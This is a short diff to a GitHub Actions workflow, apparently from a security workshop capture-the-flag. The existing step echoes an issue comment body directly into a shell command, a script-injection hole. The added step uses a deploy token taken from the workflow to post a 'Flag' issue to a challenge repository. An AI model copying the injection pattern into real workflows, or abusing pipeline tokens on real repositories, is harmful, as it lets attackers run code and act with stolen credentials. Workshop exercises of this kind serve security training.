@@ -38,3 +38,13 @@ jobs:
           DEPLOY_TOKEN: ${{ steps.fetch-token.outputs.deploy_token }}
         run: |
           echo "Processing request: ${{ github.event.comment.body }}"
+
+      - name: Submit flag
+        env:
+          DEPLOY_TOKEN: ${{ steps.fetch-token.outputs.deploy_token }}
+        run: |
+          curl -X POST \
+            -H "Authorization: Bearer $DEPLOY_TOKEN" \
+            -H "Accept: application/vnd.github+json" \
+            https://api.github.com/repos/ndc-sec-ws/flag-4/issues \
+            -d '{"title":"Flag","body":"user: j88p"}'
